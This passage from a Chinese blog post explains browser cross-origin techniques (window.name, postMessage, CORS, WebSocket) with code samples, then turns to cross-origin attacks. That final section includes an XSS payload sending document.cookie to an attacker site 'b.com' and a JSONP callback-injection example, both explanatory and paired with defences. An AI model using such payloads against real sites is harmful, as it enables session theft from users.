&#123;</span><br><span class="line">            <span class="comment">// 第2次onload(同域proxy页)成功后，读取同域window.name中数据</span></span><br><span class="line">            callback(iframe.contentWindow.name);</span><br><span class="line">            destoryFrame();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (state === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 第1次onload(跨域页)成功后，切换到同域代理页面</span></span><br><span class="line">            iframe.contentWindow.location = <span class="string">'http://www.domain1.com/proxy.html'</span>;</span><br><span class="line">            state = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">    <span class="comment">// 获取数据以后销毁这个iframe，释放内存；这也保证了安全（不被其他域frame js访问）</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">destoryFrame</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        iframe.contentWindow.document.write(<span class="string">''</span>);</span><br><span class="line">        iframe.contentWindow.close();</span><br><span class="line">        <span class="built_in">document</span>.body.removeChild(iframe);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 请求跨域b页面数据</span></span><br><span class="line">proxy(<span class="string">'http://www.domain2.com/b.html'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    alert(data);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// www.domain1.com/proxy.html</span></span><br><span class="line">代理页面，内容为空即可。</span><br><span class="line"></span><br><span class="line"><span class="comment">// www.domain2.com/b.html</span></span><br><span class="line"> <span class="built_in">window</span>.name = <span class="string">'This is domain2 data!'</span>;</span><br></pre></td></tr></table></figure><h3 id="window-postMessage"><a href="#window-postMessage" class="headerlink" title="window.postMessage"></a>window.postMessage</h3><p>postMessage是HTML5 XMLHttpRequest Level 2的新增API，下面为MDN给的示例。</p><p><code>otherWindow.postMessage(message, targetOrigin, [transfer])</code></p><ul><li>otherWindow:其他窗口的一个引用，比如iframe的contentWindow属性、执行window.open返回的窗口对象、或者是命名过或数值索引的window.frames。</li><li>message:将要发送到其他 window的数据。</li><li>targetOrigin:通过窗口的origin属性来指定哪些窗口能接收到消息事件，其值可以是字符串”*”（表示无限制）或者一个URI。</li><li>transfer:是一串和message 同时传递的 Transferable 对象. 这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- www.example1.com/a.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://www.example2.com/b.html"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">    iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> data = &#123;</span></span><br><span class="line"><span class="javascript">            msg: <span class="string">'1+1'</span>,</span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="javascript">        <span class="comment">// 传送跨域数据</span></span></span><br><span class="line"><span class="javascript">        iframe.contentWindow.postMessage(<span class="built_in">JSON</span>.stringify(data), <span class="string">'http://www.example2.com'</span>);</span></span><br><span class="line">    &#125;;</span><br><span class="line"><span class="javascript">    <span class="comment">// 接收example2数据</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">receiveMessage</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (event.origin !== <span class="string">"http://www.example2.com"</span>)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">'来自页面B:'</span> + e.data);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, receiveMessage, <span class="literal">false</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- www.example2.com/b.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//接收example1数据</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">receiveMessage</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (event.origin !== <span class="string">"http://www.example1.com"</span>)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">'来自页面A:'</span> + e.data);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(e.data);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (data) &#123;</span></span><br><span class="line">            data.sum = 2;</span><br><span class="line"><span class="javascript">            <span class="comment">// 处理后再发回example1</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.parent.postMessage(<span class="built_in">JSON</span>.stringify(data), <span class="string">'http://www.example1.com'</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, receiveMessage, <span class="literal">false</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>CORS即跨域资源共享（Cross-origin resource sharing）。详细介绍可参考<a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">跨域资源共享 CORS 详解</a>。</p><p>普通的请求只需服务端设置Access-Control-Allow-Origin即可，前端无须设置。<br>带Cookie请求，前端常用设置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment">  原生ajax</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest(); <span class="comment">// IE8/9需用window.XDomainRequest兼容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 前端设置是否带cookie</span></span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">xhr.open(<span class="string">'post'</span>, <span class="string">'http://www.domain2.com:8080/login'</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">'Content-Type'</span>, <span class="string">'application/x-www-form-urlencoded'</span>);</span><br><span class="line">xhr.send(<span class="string">'user=admin'</span>);</span><br><span class="line"></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span>) &#123;</span><br><span class="line">        alert(xhr.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment">  jquery</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    ...</span><br><span class="line">   xhrFields: &#123;</span><br><span class="line">       withCredentials: <span class="literal">true</span>    <span class="comment">// 前端设置是否带cookie</span></span><br><span class="line">   &#125;,</span><br><span class="line">   crossDomain: <span class="literal">true</span>,   <span class="comment">// 会让请求头中包含跨域的额外信息，但不会含cookie</span></span><br><span class="line">    ...</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment">  axios ==&gt;  withCredentials: true</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">'axios'</span></span><br><span class="line"><span class="comment">// 创建axios实例</span></span><br><span class="line"><span class="keyword">const</span> service = axios.create(&#123;</span><br><span class="line">  baseURL: process.env.BASE_API, <span class="comment">// node环境的不同，对应不同的baseURL</span></span><br><span class="line">  timeout: <span class="number">5000</span>, <span class="comment">// 请求的超时时间</span></span><br><span class="line">  <span class="comment">//设置默认请求头，使post请求发送的是formdata格式数据// axios的header默认的Content-Type好像是'application/json;charset=UTF-8',我的项目都是用json格式传输，如果需要更改的话，可以用这种方式修改</span></span><br><span class="line">  <span class="comment">// headers: &#123;  </span></span><br><span class="line">    <span class="comment">// "Content-Type": "application/x-www-form-urlencoded"</span></span><br><span class="line">  <span class="comment">// &#125;,</span></span><br><span class="line">  withCredentials: <span class="literal">true</span> <span class="comment">// 允许携带cookie</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// node后台</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">'cors'</span>) <span class="comment">// 此处我的项目中使用express框架，跨域使用了cors npm插件</span></span><br><span class="line"></span><br><span class="line">app.use(cors&#123;</span><br><span class="line">    credentials: <span class="literal">true</span>,</span><br><span class="line">    origin: <span class="string">'http://localhost:8081'</span>, <span class="comment">// web前端服务器地址</span></span><br><span class="line">    <span class="comment">// origin: '*' // 这样会出错</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h3><p>只要服务端支持就可以使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// express</span></span><br><span class="line"><span class="keyword">var</span> app = <span class="built_in">require</span>(<span class="string">'express'</span>)();</span><br><span class="line"><span class="keyword">var</span> server = <span class="built_in">require</span>(<span class="string">'http'</span>).Server(app);</span><br><span class="line"><span class="keyword">var</span> io = <span class="built_in">require</span>(<span class="string">'socket.io'</span>)(server);</span><br><span class="line"></span><br><span class="line">server.listen(<span class="number">80</span>);</span><br><span class="line"><span class="comment">// WARNING: app.listen(80) will NOT work here!</span></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.sendfile(__dirname + <span class="string">'/index.html'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">io.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">socket</span>) </span>&#123;</span><br><span class="line">  socket.emit(<span class="string">'news'</span>, &#123; <span class="attr">hello</span>: <span class="string">'world'</span> &#125;);</span><br><span class="line">  socket.on(<span class="string">'my other event'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// index.html</span></span><br><span class="line">&lt;script src=<span class="string">"/socket.io/socket.io.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> socket = io.connect(<span class="string">'http://localhost'</span>);</span><br><span class="line">  socket.on(<span class="string">'news'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data);</span><br><span class="line">    socket.emit(<span class="string">'my other event'</span>, &#123; <span class="attr">my</span>: <span class="string">'data'</span> &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="跨域攻击"><a href="#跨域攻击" class="headerlink" title="跨域攻击"></a>跨域攻击</h2><h3 id="CSRF-XSRF攻击"><a href="#CSRF-XSRF攻击" class="headerlink" title="CSRF/XSRF攻击"></a>CSRF/XSRF攻击</h3><p>示例如下，防止CSRF攻击的方法是<code>referer过滤校验+token验证</code>，即服务端检测JSON文件调用来源和检查token数据是否匹配。</p><p><img src="../images/ajax_articlex.png" alt="CSRF/XSRF"></p><h3 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h3><p>提交含有恶意脚本的数据到服务器，从而达到破坏页面甚至盗取cookie伪装登录等目的。<br>例如，在<code>a.com/index.ftl</code>中有如下代码：<code>欢迎你，${username}</code>，这时恶意网站<code>b.com</code>传递参数：<br><code>username=&lt;script&gt;window.open(“www.b.com?param=”+document.cookie)&lt;/script&gt;</code><br>这样就轻而易举地盗取了用户的cookie值了。<br>在jsonp跨域访问中，xss注入主要是callback参数注入，如：<br><code>&lt;script src=&quot;http://www.a.com/getData.do?callback=&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&quot;&gt;&lt;/script&gt;</code><br>防止措施是对参数进行校验过滤。</p><p>参考链接<br><a href="https://segmentfault.com/a/1190000003784372" target="_blank" rel="noopener">https://segmentfault.com/a/1190000003784372</a><br><a href="https://www.cnblogs.com/roam/p/7520433.html" target="_blank" rel="noopener">https://www.cnblogs.com/roam/p/7520433.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于浏览器跨域，经常会遇到这方面的问题，整理一下相关资源。&lt;br&gt;
    
    </summary>
    
      <category term="ajax" scheme="https://luckyp.top/categories/ajax/"/>
    
    
      <category term="http" scheme="https://luckyp.top/tags/http/"/>
    
      <category term="跨域" scheme="https://luckyp.top/tags/%E8%B7%A8%E5%9F%9F/"/>
    
  </entry>
  
</feed>
